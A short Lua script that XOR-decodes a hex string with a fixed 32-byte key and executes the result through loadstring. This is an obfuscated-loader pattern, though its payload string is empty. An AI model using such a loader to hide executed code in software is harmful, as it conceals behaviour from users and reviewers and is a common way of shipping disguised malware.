local b=bit32.bxor
local s=string.char
local n=tonumber
local c=table.concat
local h=''
local k={180,39,212,49,54,198,187,253,189,213,238,18,251,169,185,158,246,248,220,181,102,201,180,84,95,158,160,184,198,41,154,82}
local o={}
local i=1
local p=0
while i<=#h do
 p+=1
 o[p]=s(b(n(h:sub(i,i+1),16),k[(p-1)%#k+1]))
 i+=2
end
return (loadstring or load)(c(o))()
